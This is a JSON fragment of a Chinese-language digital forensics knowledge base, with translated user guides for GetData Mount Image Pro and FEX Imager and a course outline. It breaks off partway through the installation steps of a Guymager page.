Image导航栏将会打开一个对话框选择所需的镜像。该镜像将会被添加到已选择磁盘窗口。选择完毕，点击mount挂载。 在mount（挂载）窗口，选择作为磁盘挂载或者作为文件系统挂载\n然后，映像将被挂载到Windows文件系统上，并可以通过Windows资源管理器访问\n挂载dd磁盘镜像 可以使用GUI或命令行接口正常挂载单个RAW或DD取证图像。\n通常使用GUI或命令行界面可以挂载以扩展名.001、.002、.003等结尾的分段RAW或DD取证映像。\n使用描述符文件挂载分段的DD映像\n如果图像段没有.001，.002，.003等扩展，请遵循以下说明:\n创建描述符文件\n描述符文件是一个文本文件，它包含组成完整图像的所有原始取证图像的列表描述符文件的文件扩展名应该总是’.RAW’，即使它是一个文本文件。文本中的file是组成整个图像的各个文件的文件名的有序列表。\n如何创建描述符文件\n描述符文件是一种纯文本文件，它只列出取证图像的名称。空行和开头/末尾允许空格，以#开头的行作为注释行被忽略。任何回车的组合允许换行作为新的行分隔符。\n描述符文件中的相对路径首先从当前目录解析，然后从描述符文件解析的位置。\n如果所描述的取证图像的大小不是512的倍数，则该文件的容量向下舍入为512的倍数，未使用超过面积。例如，如果一个文件是5200字节，它将被视为5120字节的文件:\n描述符文件的示例:\n#这是一个注释行\nimage01.dat\nimage02.dat\nimage03.dat\n该文件应保存为\" description-file.raw\"。该文件可以保存在驱动器上的任何位置。确保它包含到图像段位置的有效路径。然后运行Mount Image Pro并选择描述符文件作为要挂载的文件。\n挂载RAID Mount Image Pro支持分析以下类型的RAID:\nJBOD\nJBOD(仅仅是一堆磁盘)是一个术语，用来描述将奇数大小的驱动器分组为一个更大的有用驱动器。例如，JBOD可以将3gb、15gb、5.5 GB和12gb驱动器组合成35.5 GB的逻辑驱动器通常比单独驱动更有用。\nRAID 0\nRAID 0(也称为Stripe或Striping)它代表了所有RAID级别中最高的存储性能。实现RAID 0至少需要两块以上硬盘，它将两块以上的硬盘合并成一块，数据同时分散在每块硬盘中。由于带宽加倍，读/写速度也加倍。这种数据上的并行操作可以充分利用总线的带宽，显著提高磁盘整体存取性能，但同时忽略了数据的可靠性，其中的任何一个硬盘失效或故障则影响到所有的数据。因此，RAID 0不能应用于数据安全性要求高的场合。下图所示数据分散在每个硬盘当中，三块硬盘的并行操作使得同一时间内磁盘读/写的速度提升4倍。\nRAID 1\nRAID 1是一个带有奇偶校验的镜像集。通常，它由两个物理驱动器组成，其中一个是其他。只要至少有一个驱动器在工作，RAID阵列就会继续运行。使用RAID 1为每个磁盘单独的控制器有时被称为双工。RAID1是将一个两块硬盘所构成RAID磁盘阵列，其容量仅等于一块硬盘的容量，因为另一块只是当作数据“镜像”。RAID 1磁盘阵列显然是最可靠的一种阵列，因为它总是保持一份完整的数据备份。它的性能自然没有RAID 0磁盘阵列那样好，但其数据读取确实较单一硬盘来的快，因为数据会从两块硬盘中较快的一块中读出。RAID 1磁盘阵列的写入速度通常较慢，因为数据得分别写入两块硬盘中并做比较。RAID 1磁盘阵列一般支持“热交换”，就是说阵列中硬盘的移除或替换可以在系统运行时进行，无须中断退出系统。RAID 1磁盘阵列是十分安全的，不过也是较贵一种RAID磁盘阵列解决方案，因为两块硬盘仅能提供一块硬盘的容量。RAID 1磁盘阵列主要用在数据安全性很高，而且要求能够快速恢复被破坏的数据的场合。\nRAID 5\nRAID5和RAID4一样，数据以块为单位分布到各个硬盘上。RAID 5不对数据进行备份，而是把数据和与其相对应的奇偶校验信息存储到组成RAID5的各个磁盘上，并且奇偶校验信息和相对应的数据分别存储于不同的磁盘上。当RAID5的一个磁盘数据损坏后，利用剩下的数据和相应的奇偶校验信息去恢复被损坏的数据。\n准备工作 在处理RAID驱动器时，应在取证获取阶段小心记录尽可能多的内容尽可能多的RAID配置信息。\nMount Image Pro中的RAID设置将通过以下知识来帮助成功:\n是硬件RAID还是软件RAID?(硬件RAID通常有单独的RAID控制卡); 什么RAID格式，JBOD, RAID 0, 1, 5, other?(raid中的驱动器大小和能力?此信息可从系统管理员或安装文档中获得)。 RAID条大小是多少?(该信息可以从RAID控制器确定) 有多少物理磁盘组成RAID? RAID中物理磁盘的顺序是什么?(注意或拍摄RAID控制器端口号可以帮助确定驱动器顺序)。 RAID是否完整且正常?有没有丢失的硬盘? 挂载RAID 一个RAID可以构建和添加到Mount Image Pro使用:\n\\1. 物理磁盘(注意:使用物理磁盘时，建议使用硬件写阻塞设备保持法医完整性);\n\\2. 法医Forensic-images;或者,\n3.物理磁盘和法医取证图像的组合。\n在case中添加RAID。\n\\1. 单击此按钮可将设备添加到当前案例。\n\\2. 在设备选择窗口中，单击 按钮。这开启了突袭配置窗口。\n硬件RAID，已知配置 输入RAID配置信息:\n并按照说明添加和测试RAID:\n硬件RAID，未知配置:\n如果您不知道您的硬件RAID驱动器的参数，Mount Image Pro将尝试\n识别RAID的配置方式。要做到这一点:\nRAID种类选择“hardware”硬件 按照正确的顺序添加驱动器(或取证图像)，或者如果未知的顺序则将它们按预定的规则匹配最正确的顺序添加; 点击“查找布局”按钮来查找建议的配置。建议的配置是 在每个新增驱动器旁边的绿色勾号表示。\n重要的是:\n建议的配置是基于驱动器中可用的信息。然而，由于\n由于RAID结构的复杂性，可能会有多个配置返回此结果。一个建议应该通过将图像添加到案例中来测试配置，以确定是否可以访问单个文件和预览。\n如果“查找布局”没有返回建议的配置，或建议的配置没有导致成功的恢复;\n如果查找布局按钮没有为每个添加的驱动器返回绿色勾号，或者建议的配置不工作，尝试以下:\n\\1. 单击“Probable Solutions”选项卡查看RAID的建议配置;\n\\2. 按照建议更改“磁盘大小”、RAID选项和驱动器顺序;\n3.点击“测试布局”按钮，测试修改后的配置;\n\\4. 添加RAID盘\n软件RAID 如果是软件RAID:\n\\1. 设置RAID类型为“software”。\n\\2. 确认软件RAID 是否有效。一个有效的软件RAID将显示为绿色添加驱动器(或取证镜像)上的标记:\n一旦确定了正确的RAID布局 识别出正确的RAID布局后，单击OK将配置的RAID驱动器添加到设备选择窗口。\n选择需要添加的RAID盘，单击“OK”，将其添加到案例中。\n一旦RAID驱动器被添加，选择和预览个别文件，以确保RAID驱动器是正确的，此时应该已成功配置并可以访问RAID中的所有文件。\n挂载网络硬盘 挂载远程网络设备 Mount image Pro能够通过UDP协议挂载远程设备。挂载网络硬盘的步骤：\n在远程计算机上运行GetDataNetworkServer.exe(该文件位于挂载映像中专业安装文件夹)。出现如下画面; 服务器进入“等待”模式来连接Mount Image Pro。注意:可能需要在远程计算机上配置防火墙设置以启用remote访问GetData UDP网络服务器。 在“设备选择”窗口中，单击“网络”按钮以打开远程服务器连接设置窗口: 服务器IP地址:\n在GetData UDP的Server IP字段中输入远程计算机的IP地址网络服务器。\n端口:\n请确保端口号与GetData使用相同的端口号UDP网络服务器。\n单击“连接”按钮，可以查看远程计算机上可用的物理和逻辑设备。选择需要的设备，单击“确定”。所选设备现在应该出现在网络下部分设备选择窗口，如下图所示: 选择网络设备，单击Mount按钮。\n使用命令行挂载 windows系统环境变量 设置PATH环境变量将简化Mount Image Pro的命令行使用。设置路径变量意味着你可以在任何DOS文件夹的命令行中执行“MIP”命令，而不必从MIP安装文件夹发出命令。\n不需要特别的设置，只需要添加工具根目录 C:\\Program Files\\GetData\\Mount Image Pro v7\\ 到系统变量即可。\n命令行函数 MIP HELP 1. START 打开MIP图形界面。\n\u003e MIP HELP START Usage : MIP.exe START Starts MIP GUI如果在MIP GUI已经打开的情况下执行该命令，则返回如下信息:\nC:\\MIP START GUI Status: RUNNING\n2. STATUS STATUS命令用来显示MIP的运行状态信息。\nhelp命令:C:\\MIP help STATUS提供了以下信息:\nC:\\\u003eMIP HELP STATUS Usage : MIP.exe STATUS Print status information This command prints the following information: Driver running state Driver start type (AUTO/MANUAL) Driver start/stop permission Driver file path Driver file version Number of disk devices Service running state Service start type (AUTO/MANUAL) Service start/stop permissionC:\\MIP STATUS\nC:\\\u003eMIP STATUS Driver File : C:\\Windows\\system32\\DRIVERS\\MIPDISKPNP.v7.sys Driver Version : 0.6.0.0 Number of Disks : 0 Start Type : AUTO Start/Stop : Administrators, Power Users Driver Status : RUNNING Helper Service : RUNNING Start Type : DISABLED Start/Stop : Administrators, Power Users3. MOUNT C:\\\u003eMIP HELP MOUNT Usage : MIP.exe MOUNT imagefile Mount a disk image as a virtual drive Options : /D:# PhysicalDrive Number By default, the first available drive number above 10 is used /L:a Drive letters to use By default, the first available drive letter is used /P:# Partition number to assign drive letter By default, drive letters are assigned to all mountable partitions /S:# Disk sector size (default is 512) /A:T Access method: ReadOnly [T or RO] (default) Read/Write emulation [F or RW] /MT:# or /T:# Mount type: 1 or MD = Disk (default) 2 or FS = File System 3 or MP = Disk PNP /E File System to be mounted to an Existing File System disk (/L) /PNP or /B Use Plug-and-Play /O:a Multiple mounting options P = Mounts physical drive only S = Show System files in file system U = Show Unallocated files in file system D = Show Deleted files in file system. /W:# Time to wait for the mounting process (in seconds) /XML Format the output in XML挂载-磁盘案例：\n使用默认配置挂载E01 C:\\MIP MOUNT IMAGE1.E01 No switches used. 指定挂载磁盘并且只读挂载E01 C:\\MIP MOUNT IMAGE1.E01 /MT:MD /L:T /A:RO Switches used: /MT:MD = Mount Type is Mount Disk /L:T = Logical drive use starts at T: /A:RO = Access is Read Only挂载-文件系统案例：\n文件系统挂载-挂载L01或AD1到相同磁盘下 E:\\\u003eMIP MOUNT /L:T /T:2 \"E:\\1406JT2.L01\" E:\\\u003eMIP MOUNT /L:T /T:2 /E \"E:\\AD1-FTK-GetData4GSD-C.ad1\" Switches used: /L:T = Logical drive use starts at T: /T:2 = File System mount type /E = Mounts the second image to the existing drive CMD line output shown below: E:\\\u003eMIP MOUNT /L:T /T:2 \"E:\\1406JT2.L01\" Mounting in progress, wait... Image \"E:\\1406JT2.L01\" contains no partition(s). Access Mode: Block Mode ----------------------------------- PhysDrive Not bootable Capacity is: 11.84 GB Is HardDisk: False Is Optical: False Label is: Type is: E:\\\u003eMIP MOUNT /L:T /T:2 /E \"E:\\AD1-FTK-GetData4GSD-C.ad1\" Mounting in progress, wait... Image \"E:\\AD1-FTK-GetData4GSD-C.ad1\" contains no partition(s). Access Mode: Block Mode ----------------------------------- PhysDrive Not bootable Capacity is: 896.2 MB Is HardDisk: False Is Optical: False Label is: Type is:4. UNMOUNT取消挂载 C:\\\u003e MIP HELP UNMOUNT Usage : MIP.exe UNMOUNT /D:# or /L:a or /ALL Unmount a disk image Options : /D:# Physical drive number which can be obtained using LOOKUP command Use '*' to unmount all existing disks /L:a Partition drive letter /ALL Unmount all existing disks /F or /Q Suppress prompting and force all images to close. /W:# Time to wait for the unmounting process (in seconds) Drives cannot be dismounted while they are used by any other programs. Although you can force to close the image by answering to do so when asked or by using the /F option, you should be aware that to forcibly closing an image may lead to loss of data or unexpected behavior of the operating system.5. VIEW C:\\\u003eMIP HELP VIEW Usage : MIP.exe VIEW imagefile or /D:# or /L:a or /ALL Print disk image information Options : /D:# Physical drive number which can be obtained using LOOKUP command /L:a Partition drive letter /ALL Display information about all mounted images. (Default) /XML Format the output in XML 6. LOOKUP C:\\\u003eMIP HELP LOOKUP Usage : MIP.exe LOOKUP imagefile or /L:a Lookup mounted drive letters or forensic-image(s) Options : /D:# Physical drive number which can be obtained using LOOKUP command /L:a Partition drive letter /XML Format the output in XML Print the following information for the image or drive letter: Mounted Forensic-image Names Drive Letters and Partition Numbers List7. HIDEGUI / SHOWGUI 显示和隐藏图形界面 C:\\\u003eMIP HIDEGUI GUI Status: RUNNING C:\\\u003eMIP MOUNT IMAGE1.E01 Mounting in progress, wait... Image \"C:\\IMAGE1.E01\" contains no partition(s). Access Mode: Block Mode ----------------------------------- PhysDrive Not bootable Capacity is: 7.47 GB Drive Letter: \\\\.\\PHYSICALDRIVE4 Is HardDisk: True Is Optical: False Label is: Type is: Physical C:\\\u003e8. CLOSE 关闭图形界面\nC:\\\u003eMIP HELP CLOSE Usage : MIP.exe CLOSE Closes MIP GUI C:\\\u003eMIP UNMOUNT /ALL Closing all mounted images... The image(s) is closed. C:\\\u003eMIP CLOSE GUI Status: CLOSED9. DRIVE STATUS磁盘状态 C:\\\u003eMIP DRIVERSTATUS =============================== Fetching 64bit PNP Status... =============================== Installed Modules: 1 ServicePath: C:\\Windows\\system32\\DRIVERS\\MIPDISKPNP.v6.sys FileVersion: 6.0.7.10 ServiceStatus: Started MarkedForDeletion: False RebootRequired: False InfPath: C:\\Windows\\inf\\oem135.inf InfValues: ServiceName: MIPDISKPNP.v7 HardwareId: root\\mipdisk_storlib_bus_v6 ClassName: MIPDiskStorageLib ClassGuid: {803821A4-46BF-4D3D-9916-32FA68EC74BA} PNP DevicePresent: True =============================== Fetching 64bit FileSys Status... =============================== Installed Modules: 1 ServicePath: C:\\Windows\\system32\\DRIVERS\\MIPFS.v6.sys FileVersion: 6.0.2.21 ServiceStatus: Started MarkedForDeletion: False RebootRequired: False InfPath: C:\\Windows\\inf\\oem136.inf InfValues: ServiceName: MIPFS.v7 HardwareId: root\\mipfs_storlib_bus_v7 ClassName: MIPFSStorageLib ClassGuid: {DC7F5B75-7C53-42AE-8611-9C2B5A46530F} PNP DevicePresent: True10. 驱动安装和卸载DRIVERINSTALL/DRIVERUNISNTALL 安装需要管理员身份。\n",
    "description": "",
    "tags": null,
    "title": "GetData Mount Image Pro",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/GetData_Mount_Image_Pro/index.html"
  },
  {
    "content": "官网 http://www.forensicimager.com/\n基于windows程序，文件格式取证转换工具\nForensic Explorer (FEX) 是用户保存、分析和展示电子证据的软件。该软件的主要用户是执法机构、政府、军队和企业调查机构。\n主要特点 特点 获取物理，逻辑，文件夹和文件。 重新获取现有的取证图像文件。 支持使用GetData Forensics Servlet从远程设备进行获取。 使用MD5，SHA1或SHA256采集哈希值获取.E01或DD格式。 使用完整的MD5，SHA1或SHA256文件哈希获取L01格式的文件夹和文件。 创建后自动验证采集哈希。 对整个设备成像或设置开始和结束扇区位置。 将图像文件分割成没有段大小限制的自定义段。 设置设备扇区大小以获取512、2048或4096扇区大小的选项。 强制将Windows兼容文件名与Magnet Forensics产品一起使用的选项。 压缩格式 支持E01和L01格式的EnCase None，Fast，Good，Best压缩设置。包括E01和L01格式写入采集信息。\n日志 记录详细的日志文件，包括设备详细信息以及源和验证哈希信息。\nFEX imager官方使用手册（已翻译） 📎FEX Imager User Guide.en.pdf\nPublished: 14-Jul-20at 15:37:58\n运行FEX imager 写块 计算机取证的一个公认原则是，在可能的情况下，在调查中获取数据不得被研究者更改。\n如果物理介质，如硬盘驱动器，USB驱动器，相机卡等是一个潜在的证据来源，它是当存储媒体连接到取证工作站时，建议使用取证写块设备(写块工具)。写块工具通常是一个物理硬件设备，它位于目标媒体设备和调查人员工作站。它确保调查员不可能在无意中改变被检查设备的内容。它允许对目标设备的只读访问而不损害数据的完整性。市面上有各种各样的法医写阻塞装置。鼓励调查人员了解他们所选择的设备、及其功能、局限性。\n源窗口 FEX Imager是通过运行FEX Imager启动的。在程序安装文件夹中，或从已安装的桌面图标。\n当FEX Imageris运行时，就会看到Sourcewindow:\n来源指的是要获取的数据。来源可以是:\n• 物理驱动器(即物理硬盘)。\n• 一个逻辑驱动器(即一个分区，如C:\\或D:)。\n• 位于分区上的文件夹或文件。\n• 现有的法医图像(即E01或DD图像文件)。\n• 使用Forensic Explorer servlet访问的远程驱动器。\n要选择源代码，请单击“选择”按钮，并从下拉菜单中选择所需的选项:\n物理和逻辑盘 在大多数情况下，等待符合任何压倒一切的案件特定的法律要求，一个调查员将对一个实物设备进行取证镜像。对物理设备进行镜像可以访问整个媒体的内容，例如分区之间的空间。Carrier,2005年,说:“经验法则是我们认为在最低层数据采集会有证据。为大多数情况下，调查人员获得磁盘的每个扇区”。(48页)\n注意:如果物理驱动器没有显示在这个窗口，这通常是因为FEX Imager没有使用管理员身份启动，它没有足够的权限访问物理驱动器。重新启动FEX Imager，右键单击桌面图标，并选择以管理员身份运行从下拉菜单。\n设备选择窗口包含以下信息:\n标签:列出物理驱动器及其Windows设备号。编号从0开始。逻辑驱动器显示驱动器标签(如果没有标签，则使用\"{no label}\")。图像文件显示图像的路径。 Size: Size列包含物理或逻辑设备的大小，或者映像文件的大小。(注意，报告的驱动器大小通常小于驱动器标签上打印的大小。这是因为制造商在操作时以十进制字节数报告大小系统以1024块为每个KB报告大小)。 FS:磁盘上的文件系统，如FAT、NTFS、HFS、APFS。 类型:描述驱动器连接到计算机的方式。图像文件将显示图像类型(如EnCase®或RAW)。 添加远程设备 FEX Imager拥有使用UDP协议检查远程设备跨网络的能力\nhttps://en.wikipedia.org/wiki/User_Datagram_Protocol)\n要是用远程设备需要，在接收端开启UDP服务，并有必要部署GetData UDP网络服务。它可以在FEX Imagerinstallation文件夹GetDataNetworkServer.exe中找到。部署了GetData UDP网络服务器后，运行命令，显示如下界面:\n服务器IP:运行网络服务器的计算机的IP地址。重要的是:在排除故障时，使用CMD行“IPCONFIG”重复检查IP地址。命令以确保正确的机器地址。\n服务器端口:通信端口。\n服务器状态:服务器进入“等待”模式，等待来自取证资源管理器的连接。\n请注意，可能需要配置本地和远程计算机上的防火墙设置以启用远程访问GetData UDP网络服务器。\n网络服务器命令行选项\nGetData UDP网络服务器可以从CMD行部署在远程计算机上\n以下开关:\n• /Q 安静模式(没有GUI);\n• /P: XXXX 指定端口号。\n重要提示:在静默模式下部署时:\n在Windows任务中，GetData UDP网络服务器将显示为一个正在运行的进程管理。进程的名称是可执行文件的名称(即重命名为“GetData UDP”) 网络服务器”根据需要)。\nGetData UDP网络服务器只能在Windows环境下通过结束进程来终止任务管理器。 将GETDATA UDP网络服务器部署为WINDOWS服务\nGetDataNetworkServer可以作为Windows服务部署。\n要安装为服务，使用以下命令行开关:\n• GetDataNetworkServer /install /silent\n要卸载该服务，请使用以下开关:\n• GetDataNetworkServer /uninstall /silent\n如果需要非默认端口(即443以外的端口)，则必须将以下键值添加到注册表指定端口号:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\GDStreamService\\UDPPort(DWORD)=443\n连接GETDATA UDP网络服务器\n要连接到GetData UDP网络服务器，运行Forensic Imager并在Sourcewindow中单击\nselect\u003eRemote:\n“服务器IP地址”: 在“服务器IP地址”中输入远程计算机的IP地址GetData UDP网络服务器字段。\n最大数据包大小: 设置通过UDP传递的最大数据包大小。在当地可靠网络设置可以更高，这可以使连接更多非常高效。如果不是本地网络，则最大数据包大小为1500推荐(如果可能，测试以确定最佳设置)。\n校验和网络包: checksum字段用于UDP报头和数据的错误检查。虽然这会增加开销，但建议应用此设置。\n端口: 端口号与GetData UDP网络使用的端口号保持一致服务器(默认为443端口)。\n连接: connect按钮激活到IP地址和端口的连接并列出远程上可用的物理和逻辑设备电脑。\n速度测试: “速度测试”页签测试指定设备的网络连接速度。在Connect选项卡中，选择所需的设备，然后更改为速度测试选项卡。单击Start启动测试。\n在Connect选项卡中选择所需的设备后，单击ok按钮连接到远程设备设备。选择的设备现在应该出现在设备选择的网络部分窗口，如下图7所示:\n选择ok即可。\n选择扇区 在特定情况下，调查人员可能需要从设备获取一系列扇区。在这个在源文件底部的扇区范围字段中输入的扇区名称、扇区起始和结束信息选择窗口。\n当源设备被选中时，源选择窗口将填充设备信息:\n获取hash 一旦一个源被选中，在源窗口的底部有两个选项:\nhash 当用户只想为设备计算哈希值时(例如，验证现有电子取证镜像文件的哈希值)。\n目的地 选择Destination按钮以获取一个电子取证镜像文件。下面将对此进行更详细的描述。\n目标窗口 如图所示，图像目标屏幕是图像文件的参数所在设置，包括类型、压缩、名称、位置等。\n镜像类型 调查人员可以选择在下列任何一个电子取证文件中创建取证镜像格式:\nDD/RAW DD/RAW格式源自UNIX命令行环境。创建一个DD/RAW映像从输入源读取数据块并直接写入图像文件。简单的DD图像可以将图像数据与源数据进行比较，但格式缺乏一些在更现代的格式中发现的功能，包括错误纠正和压缩。\nENCASE®.E01 EnCase®E01证据文件格式由Guidance Software Inc.创建。它被广泛接受法医社区作为镜像文件的标准。更多资料请浏览www.guidancesoftware.com。EnCase®E01的结构。E01格式允许大小写和验证存储在镜像文件中的信息(CRC和MD5)。EnCase®文件格式的结构\n如下所示:\nCRC 循环冗余校验（Cyclic Redundancy Check， CRC）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种信道编码技术，主要用来检测或校验数据传输或者保存后可能出现的错误。\n文件名和文件夹 filename和Folderfields为映像文件设置目标路径和文件名。输出文件“名称”是将被写入调查员法医工作站的电子取证镜像文件的名称。单击文件夹图标以浏览目标文件夹。\n分割大小 Segment Size设置创建的取证镜像文件的段大小。设置图像段大小为主要用于法医图像文件以后将存储在固定长度的媒体，如CD或DVD。E01image格式，FEX Imager使用EnCase®v6标准，不限于2GB段的大小。然而，如果调查人员计划使用更大的文件段，他们应该考虑处理图像文件的系统的限制(RAM等)。\n镜像hash 为镜像数据选择并计算一个或多个哈希值:MD5、SHA1、SHA256。哈希值为一种用于识别、验证和验证文件数据的数学计算。一个在获取设备期间，FEX imager计算的哈希值(“获取哈希”)使能调查员，通过重新计算哈希以后(“验证哈希”)，以确认真实性图像文件，即文件没有改变。对所获取图像的任何改变都会导致对的散列值。\n在采集过程中计算哈希值需要CPU时间，并且会增加计算持续时间。然而，根据公认的最佳法医实践，我们建议，在获取具有潜在证据价值的数据时，总是包含一个获取哈希。这也是建议调查人员在调查过程中定期重新计算验证散列以确认镜像的真实性。FEXImager有三个独立的哈希计算选项:MD5、SHA1和SHA256。研究者应该选择最适合的哈希选项:\nMD5（消息摘要算法5 ) MD5是RSA (Ron Rivest, Adi Shamir和Len)于1991年设计的一种广泛使用的密码算法Alderman)。它是一个128位的散列值，唯一标识一个文件或数据流。它已经被自二十世纪九十年代后期开始广泛应用于电脑取证。1996年，密码分析研究发现了MD5算法的一个弱点。2008年在美国计算机应急准备小组(USCERT)发布了漏洞说明VU#836068，声明MD5散列:“……应被认为密码已被破解，不适合进一步使用”。\nSHA1 1995年，联邦信息处理标准发布了SHA1哈希标准，在MD5的支持下被一些取证工具所采用。然而，在2005年2月，有人宣布在SHA1中发现了一个理论缺陷，这表明它在该领域的应用可能很短暂。(3) (4)\nsha-256 从2011年开始，SHA-256有望成为计算机取证领域新的哈希验证标准。sha-2是一组加密哈希函数(SHA-224、SHA-256、SHA-384和SHA-512)，由美国国家安全局(NSA)，并由美国国家标准协会和美国国家安全局发布技术。\n有关散列以及如何将散列值的强度应用于取证的详细信息研究者建议阅读的内容包括:“The Hash Algorithm Dilemma–Hash Value Collisions哈希算法困境-哈希值冲突”，刘易斯，2009年,法医杂志。(5)\n压缩 EnCase®。E01file格式支持在采集过程中压缩镜像文件。在采集过程中压缩法医镜像文件需要较长的时间，但文件大小调查员工作站的法医镜像会变小。达到的压缩量将取决于被成像的数据。例如，使用已经压缩的数据，如音乐或视频，很少额外的压缩将实现。DD/RAW镜像格式不支持压缩。\n创建镜像后的确认 在获取设备的过程中，获取的哈希值(MD5和/或SHA1和/或SHA256)当从源磁盘读取数据时，计算调查员选择)。一旦收购成功完成后，获取哈希将以格式在事件日志中报告:\nAcquisition[hash type] Hash : 94ED73DA0856F2BAD16C1D6CC320DBFA（采集[哈希类型]哈希）\nEnCase®。MD5获取哈希嵌入在镜像文件的头中。\n当选择“创建后验证镜像”框时，完成镜像文件FEX的写入Imager从取证工作站读取文件并重新计算散列。验证散列在事件日志中报告的格式:\nVerification[hash type] Hash:94 ed73da0856f2bad16c1d6cc320dbfa （验证(哈希类型)散列）\n验证过程完成后，将在源哈希和验证哈希之间进行比较。一个精确的源磁盘镜像到镜像文件的结果应该“匹配”:\n[hash type]hashes:Match (哈希类型)散列:匹配\n如果获取哈希和验证哈希不匹配，则表明出现了问题，而且这个设备应该被重新制作镜像。\n细节 EnCase®。E01文件，详细信息字段的值被写入镜像文件头。DD不把这些信息作为映像的一部分来存储;但是，它仍然必须被输入，以便信息可以包含在FEX Imager事件日志中。\n进程窗口 进度屏幕显示源信息(正在获取的驱动器)和目标信息(正在写入法医图像文件的位置)。进度信息，包括运行时间，显示剩余时间和传输速度。进度窗口如下图12所示:\n进度窗口的下半部分提供了关于获取过程的摘要信息，包括散列信息。\n如果选择了E01镜像格式，则采集散列存储在取证镜像中。如果验证镜像创建后，在FEX Imager目标窗口中选择了选项，进度窗口将包括:\n**采集[哈希类型]哈希:**采集数据的哈希值，存储在E01中。\n**验证[哈希类型]哈希:**法医镜像文件中的数据的哈希值。\n注意，如果选择了DD镜像格式，那么散列值就不会存储在DD镜像文件中。\n日志文件 每次获取的事件日志都会自动保存到与镜像文件/s相同的文件夹中。\n错误的扇区和错误报告 由于整个驱动器的问题或问题，在映像处理过程中可能会出现磁盘错误孤立于特定扇区。如果一个坏扇区被识别，FEXImager会为不能被识别的数据写0读取并记录事件日志中发现的坏扇区的位置。\nFEX相关课程 Level One\nForensic Explorer Overview and Introduction\n• Installation and wworkstation configuration\n• Case management\n• Dongle activation and maintenance\n• Advanced WiBu key and network configuration\nForensic Acquisition\n• Write blocking v Write protection\n• Network examinations and analysis\n• GetData Forensic Imager\nCreating a Digital Case\n• Adding and removing evidence within FEX • Assessment and preview of evidence\n• Creating, converting previews and saving a case\n• Creating and managing investigators profiles\n• Understanding the evidence processor\nLevel Two\nForensic Explorer Interface\n• Module data interpretation\n• Customizing layouts\n• Process logging and prioritization\n• Date and time verification\n• Digital forensics date and time analysis\n• FAT, NTFS, HFS, HFS+, APFS, CDFS file systems\n• Handling, Bitlocker and File vault encrypted containers\n• Date and time information in the Windows registry\nCase Investigation and Analysis\n• Module structure and overviews\n• Folder tree structure\n• Categories filters\n• Data Views\n▪ File list, Gallery, Disk, Category Graph\n• File Views\n▪ Hex and text\n▪ Bookmark\n▪ Byte plot and character distribution\n▪ Display– (Native interpretation) ▪ File system record\n▪ Metadata\n▪ File extent\n▪ Property viewer (Email Module)\nData M****anagement\n• Filters\n• Data and file view internal searching Keyword and Index Searching\n• Keyword Search – Management\n▪ Text, Hex, Regular Expressions (PCRE)\n• dtSearch analysis and searching techniques\nBookmarking – Investigator’s Notes and Observations\n• Relationship between bookmarks and reports.\n• Manual and automated bookmarking\n• Modification of bookmarks\nLevel Three\nExamining Shadow Copy\n• Shadow copy identification\n• Shadow copy file carving\n• Shadow copy forensic analysis\n• Recreating historic restore points\nLive Boot / Mount Image Pro / Virtual Machine\n• Live Boot virtualization of subject evidence\n• Password bypass / recovery of user accounts\n• Deployable Live Boot for VirtualBox\nHash Analysis\n• Hash values and algorithms\n• Creating and using hash sets\nSignature Analysis and File Carving\n• File signature analysis\n• Signature/File header and footer identification\n• Recovering Deleted Partitions\nEmail Module\n• Microsoft Outlook .PST email analysis\n• Identifying and analysis of email attachments\nRegistry Module\n• Automated registry analysis\n• Deleted registry keys\nIntroduction to FEX Scripting Functionality\n• Script functionality behind the FEX Interface\n• Using automated scripts\nLevel Four\nReport Writing and Management\n• Creating manual reports\n• Creating and modifying templates\n• Saving and exporting templates\n• Exporting reports FEX Viewer\n• Review of case using dongle free viewer Final Hands-on Practical\n• Practical assessment covering all aspects of the previous four day’s activities\n• Award ‘Forensic Explorer Certified Examiner (FEXCE)” certification upon successful completion\n参考文章 https://www.champlain.edu/Documents/LCDI/Tool_Comparison_(1).pdf\n[http://download.getdata.com/support/documents/user-guides/FEX%20Imager%20User%20Guide.en.pdf](http://download.getdata.com/support/documents/user-guides/FEX Imager User Guide.en.pdf)\n",
    "description": "",
    "tags": null,
    "title": "GetdataForensicImager",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/GetdataForensicImager/index.html"
  },
  {
    "content": "官网：https://guymager.sourceforge.io/\n下载：https://sourceforge.net/projects/guymager/\n版本更新订阅：https://sourceforge.net/p/guymager/activity/feed\n简介 Guymager[ˈgɪmɪdʒər]是一款免费的媒体采集取证成像仪。它的主要特点是:\n•简单的用户界面在不同的语言\n•在Linux下运行\n•非常快，由于多线程，流水线设计和多线程数据压缩\n•充分利用多处理器机器\n•生成平面(dd)， EWF (E01)和AFF映像，支持磁盘克隆\n•免费，完全开源\n最新版本是0.8.12。\n界面 解释:\n• 连接的存储设备列表在上方。新设备可以在任何时候连接-按下重新扫描按钮显示他们。\n• 浅红色标识的设备为本地硬盘。它们不能被获取，从而防止获取错误的磁盘。本地硬盘可以通过输入配置文件中的序列号来识别。\n• 下方显示了蓝色光标当前所选择的收购的更详细信息。[ 上面的截图显示了默认的获取对话框。存在另一个用于克隆磁盘的对话框。两者都可以很容易地适应您的需求。您可以添加或删除字段。您可以静态(文本)和动态(当前日期，磁盘大小，序列号，…)设置它们的默认值。看一下 /etc/guymager/guymager.cfg**.**\n安装 Debian和Ubuntu Guymager包含在几个发行版的标准存储库中，例如Debian(紧凑版或更高版本)和Ubuntu(10.04或更高版本)。在Ubuntu中，需要保持更新。\n安装可以通过一个图形工具来完成，比如Ubuntu软件中心或者Synaptic:\nsudo apt-get update\nsudo apt-get install guymager\n使用pinguin APT服务器 Daniel’s pinguin服务器总是包含Guymager的最新版本。它是安装Guymager并保持其最新的推荐存储库。在您的Ubuntu、Debian和基于Debian的Linux系统中使用这个存储库,遵循以下步骤:\n通过以下命令添加pininguin服务器及其公钥: sudo wget -nH -rP /etc/apt/sources.list.d/ http://deb.pinguin.lu/pinguin.lu.list\nwget -q `[`http://deb.pinguin.lu/debsign_public.key`](http://deb.pinguin.lu/debsign_public.key)` -O- | sudo apt-key add 